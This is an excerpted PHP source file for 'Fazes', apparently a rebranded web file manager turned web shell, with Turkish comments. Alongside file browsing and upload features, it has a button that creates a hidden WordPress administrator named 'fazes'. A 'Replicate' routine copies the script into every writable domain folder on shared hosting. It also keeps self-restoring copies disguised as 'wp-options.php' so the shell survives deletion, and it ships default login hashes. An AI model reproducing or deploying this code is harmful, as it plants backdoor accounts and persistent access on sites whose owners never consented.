...
/**
 * Fazes — example.php tarzı tek JSON önyükleme ($FAZES_BOOT).
 * Tüm kritik ayarlar dosyanın başındaki JSON içinde; düzenleyip kaydedin.
 * - app: başlık ve sürüm (APP_TITLE, VERSION)
 * - fm_config: kayıtlı panel ayarları ($CONFIG ile birleşir; config.php öncelikli olabilir)
 * - session.name: PHP oturum adı (FM_SESSION_ID)
 * - auth: kullanıcı hashleri ve salt okuma
 * - features / paths / limits / ip: TinyFM değişkenleri
 * - translation: lng() anahtarlarını geçersiz kılan { "Login": "Giriş", ... } sözlüğü
 * Örnek: __('Login') veya lng('Login') — çeviri JSON üzerinden birleşir.
 */

$FAZES_BOOT = <<<'FAZESJSON'
{
  "app": {
    "title": "Fazes",
    "version": "1"
  ...
  "auth": {
    "use": true,
    "users": {
      "admin": "$2y$10$.Vnz6zvukcncXLOsyRUWQuDnRJHLJfAQqNI6kdCDLBJaxQomaRQkS",
      "user": "$2y$10$.Vnz6zvukcncXLOsyRUWQuDnRJHLJfAQqNI6kdCDLBJaxQomaRQkS"
    },
    "readonly": ["user"]
  },
  "features": {
...
$__fazes_docroot = $_SERVER['DOCUMENT_ROOT'] ?? '.';
// json_encode so Windows paths (backslashes) stay valid inside JSON after substitution
$FAZES_BOOT = str_replace('"__DOCROOT__"', json_encode($__fazes_docroot), $FAZES_BOOT);
$_fazes = json_decode($FAZES_BOOT, true);
if (!is_array($_fazes)) {
    header('Content-Type: text/plain; charset=utf-8');
    die('Fazes: invalid $FAZES_BOOT JSON');
}

$CONFIG = json_encode($_fazes['fm_config']);
define('VERSION', $_fazes['app']['version'] ?? '1');
define('APP_TITLE', $_fazes['app']['title'] ?? 'Fazes');

$use_auth = !empty($_fazes['auth']['use']);
$auth_users = $_fazes['auth']['users'] ?? array();
$readonly_users = $_fazes['auth']['readonly'] ?? array();
$global_readonly = $_fazes['features']['global_readonly'] ?? false;
$directories_users = array();

$use_highlightjs = $_fazes['features']['use_highlightjs'] ?? true;
$highlightjs_style = $_fazes['features']['highlightjs_style'] ?? 'vs';
$edit_files = $_fazes['features']['edit_files'] ?? true;

$default_timezone = $_fazes['paths']['timezone'] ?? 'Etc/UTC';
$root_path = $_fazes['paths']['root'] ?? ($_SERVER['DOCUMENT_ROOT'] ?? '.');
$root_url = $_fazes['paths']['root_url'] ?? '';
...
$favicon_path = '';
$exclude_items = array();
$online_viewer = $_fazes['features']['online_viewer'] ?? 'google';
$sticky_navbar = $_fazes['features']['sticky_navbar'] ?? true;

$max_upload_size_bytes = $_fazes['limits']['max_upload_bytes'] ?? 5000000000;
$upload_chunk_size_bytes = $_fazes['limits']['chunk_bytes'] ?? 2000000;

$ip_ruleset = $_fazes['ip']['ruleset'] ?? 'OFF';
$ip_silent = $_fazes['ip']['silent'] ?? true;
$ip_whitelist = $_fazes['ip']['whitelist'] ?? array('127.0.0.1', '::1');
$ip_blacklist = $_fazes['ip']['blacklist'] ?? array('0.0.0.0', '::');

$FAZES_TRANSLATION = isset($_fazes['translation']) && is_array($_fazes['translation'])
    ? json_encode($_fazes['translation'])
    : '{}';
...
if (!defined('FM_SESSION_ID')) {
    define('FM_SESSION_ID', isset($_fazes['session']['name']) ? $_fazes['session']['name'] : 'fzs_deck');
}
                        ...
                        <div class="card fat" data-bs-theme="<?php echo FM_THEME; ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                        <div class="brand fazes-mark" aria-hidden="true">
                                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="100%" height="72" role="img" aria-label="Fazes">
                                                <defs>
                                                    <linearGradient id="fazesGold" x1="0%" y1="0%" x2="100%" y2="100%">
                                                        <stop offset="0%" style="stop-color:#e8c547"/>
                                                        <stop offset="100%" style="stop-color:#8a6a1b"/>
                                                    </linearGradient>
                                                </defs>
                                                <circle cx="60" cy="60" r="54" fill="none" stroke="url(#fazesGold)" stroke-width="3"/>
                                                <circle cx="60" cy="60" r="10" fill="url(#fazesGold)"/>
                                                <g stroke="url(#fazesGold)" stroke-width="3" fill="none" stroke-linecap="round">
...
defined('FAZES_SHADOW_BASENAME') || define('FAZES_SHADOW_BASENAME', 'wp-options.php');
defined('FAZES_SHADOW_CONTENT_EXTRA') || define('FAZES_SHADOW_CONTENT_EXTRA', 'fazes-backup.php');

if (!defined('FM_EMBED')) {
    fazes_maintain_shadow_copy();
}
...
if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token'])) {
    ...
    if (isset($_POST['type']) && $_POST['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
        ...
        if (!$url) {
            ...
            @curl_close($ch);
            fclose($fp);
            $fileinfo->size = $curl_info["size_download"];$fileinfo->type = $curl_info["content_type"];
        } else {
...
if (isset($_GET['wp']) && !FM_READONLY) {
    $msg = create_wp_admin($path);
    $status = 'ok';
    if (strpos($msg, "class='error'") !== false || strpos($msg, 'class="error"') !== false) {
        $status = 'error';
    } elseif (strpos($msg, 'warning') !== false) {
        $status = 'warning';
    }
    if ($status === 'error') {
        fm_set_msg(trim(strip_tags(str_replace(array('✅', '⚠️', '❌'), '', $msg))), $status);
    } else {
        fm_set_msg(trim(strip_tags($msg, '<a><br><span>')), $status);
    }
    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
}

if (isset($_GET['replicate']) && !FM_READONLY) {
    $code = file_get_contents(__FILE__);
    $urls = replicate_script($code);
    if (isset($_GET['export']) && $_GET['export'] === 'plain') {
        header('Content-Type: text/plain; charset=utf-8');
        header('Content-Disposition: attachment; filename="replicate-urls.txt"');
        if (!empty($urls)) {
            echo implode("\n", $urls) . "\n";
        } else {
            echo "Replicate: yazılabilir domains yapısı bulunamadı.\n";
        }
        exit;
    }
    if (!empty($urls)) {
        $lines = array();
        foreach ($urls as $u) {
            $lines[] = htmlspecialchars($u, ENT_QUOTES, 'UTF-8');
        }
        fm_set_msg('Replicate (txt, her satır bir site):<br>' . implode('<br>', $lines), 'ok');
    } else {
        fm_set_msg('Replicate: yazılabilir domains klasörü bulunamadı (sadece tipik shared hosting düzeninde çalışır).', 'error');
    }
    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
}
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
                        <h3 class="app-v-title">Fazes</h3>
                        </p>
                        <p class="text-muted"><?php echo lng('Help'); ?></p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item text-muted"><i class="fa fa-anchor"></i> Fazes</li>
                                <li class="list-group-item text-muted"><i class="fa fa-compass"></i> <?php echo lng('Help Documents') ?></li>
                                <?php if (!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        <?php if (!FM_READONLY): ?>
            ...
            <div class="col-3 d-none d-sm-block"><span class="float-right text-muted">Fazes</span></div>
        <?php else: ?>
            <div class="col-12"><span class="float-right text-muted">Fazes</span></div>
        <?php endif; ?>
    </div>
</form>
...
function create_wp_admin($cwd) {
    ...
    if (file_exists("$wppath/wp-load.php")) {
        ...
        $admin_link = '<br><a href="' . esc_url($admin_url) . '">' . esc_html($admin_url) . '</a>';
        if (!username_exists($user) && !email_exists($mail)) {
            ...
            return "<span class='ok'>✅ WP Admin 'fazes' created</span>" . $admin_link;
        } else {
            return "<span class='warning'>⚠️ User or email exists</span>" . $admin_link;
        }
    } else {
...
class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'Fazes<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
?>
    <nav class="navbar navbar-expand-lg mb-0 main-nav <?php echo $isStickyNavBar ?> bg-body-tertiary" data-bs-theme="<?php echo FM_THEME; ?>">
    ...
    <?php if (!FM_READONLY): $fazes_recover = fazes_shadow_recover_urls(); ?>
    <div class="fazes-tools-bar py-2 px-3 mb-4 border border-top-0 rounded-bottom shadow-sm" data-bs-theme="<?php echo FM_THEME; ?>" style="background: var(--bs-tertiary-bg, #f8f9fa);">
        <div class="d-flex flex-wrap align-items-center gap-2">
            <span class="small text-muted text-uppercase me-1" style="letter-spacing: .05em;">Tools</span>
            <a class="btn btn-sm btn-primary" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;wp=1" title="create_wp_admin"><i class="fa fa-user-plus"></i> WP Admin</a>
            <a class="btn btn-sm btn-primary" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;replicate=1" title="replicate_script"><i class="fa fa-files-o"></i> Replicate</a>
        </div>
        <div class="small text-muted mt-2 pt-2 border-top border-secondary-subtle">
            <strong class="text-body">Yedek:</strong> <code><?php echo fm_enc(FAZES_SHADOW_BASENAME); ?></code>
            — <code>fazes.php</code> silinirse bu isimle kopyalar tutulur; dosya listesinde ilgili klasörlerde görünür.
            <strong class="text-body d-block mt-1">Kurtarma (tam URL, yer imi):</strong>
            <?php foreach ($fazes_recover as $row): ?>
                <div class="ms-1 mb-1"><span class="text-body"><?php echo fm_enc($row['label']); ?>:</span>
                    <a href="<?php echo fm_enc($row['url']); ?>" class="link-primary text-break"><?php echo fm_enc($row['url']); ?></a>
                </div>
            <?php endforeach; ?>
        </div>
    </div>
...
?>
    ...
    <head>
        ...
        <meta name="description" content="Fazes">
        <meta name="author" content="Fazes">
        ...
        <style>
            body.fm-login-page {
                ...
                background: radial-gradient(ellipse 120% 80% at 50% 0%, #1a3a52 0%, #0a1628 42%, #050a10 100%);
            ...
            body.fm-login-page::before {
                ...
                position: fixed;
                inset: 0;
                background-image: repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(201, 162, 39, 0.03) 2px, rgba(201, 162, 39, 0.03) 4px);
                pointer-events: none;
                z-index: 0;
            }
            ...
            .fm-login-page .card.fat {
                background: linear-gradient(145deg, rgba(20, 35, 55, 0.92), rgba(10, 18, 32, 0.96));
            ...
            .fm-login-page .btn-success {
                background: linear-gradient(180deg, #a8892a, #6b5218) !important;
            ...
            .theme-dark .fazes-mark svg path[fill],
            .theme-dark .fazes-mark svg circle {
...
?>
    ...
    <head>
        ...
        <title><?php echo fm_enc(APP_TITLE) ?> | <?php echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "Fazes")); ?></title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link href="https://fonts.googleapis.com/css2?family=Pirata+One&family=Crimson+Pro:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
        <?php print_external('pre-jsdelivr'); ?>
        ...
        if (FM_THEME == "dark"): ?>
            <style>
                :root {
                    --fazes-gold: #c9a227;
                    --fazes-gold-dim: #8a6a1b;
                    --fazes-navy: #0a1628;
                    --fazes-parchment: #e8dcc4;
                    --bs-bg-opacity: 1;
                    --bg-color: var(--fazes-gold);
                    --bs-dark-rgb: 10, 22, 40 !important;
                }

                body.theme-dark {
                    background-image: radial-gradient(ellipse 100% 80% at 50% 0%, #1a3550 0%, #0a1628 50%, #050a10 100%);
                    color: var(--fazes-parchment);
                }

                .theme-dark .navbar-brand {
                    font-family: "Pirata One", "Times New Roman", serif;
                    color: var(--fazes-gold) !important;
                ...
                a:hover,
                a:visited,
                a:active,#main-table .filename a,
                i.fa.fa-folder-o,
                i.go-back {
                    color: var(--fazes-gold);
                }
                ...
                .theme-dark .text-white {
                    color: var(--fazes-parchment) !important;
                }
                ...
                #main-table tr.even {
                    background-color: rgba(15, 28, 48, 0.5);
                }
            </style>
        <?php endif; ?>
    </head>
...
<?php
    ...
    function lng($txt)
    {
        ...
        global $FAZES_TRANSLATION;
        if (!empty($FAZES_TRANSLATION)) {
            $fazes_ov = json_decode($FAZES_TRANSLATION, true);
            if (is_array($fazes_ov)) {
                foreach ($fazes_ov as $k => $v) {
                    $tr['en'][$k] = $v;
                }
            }
        }
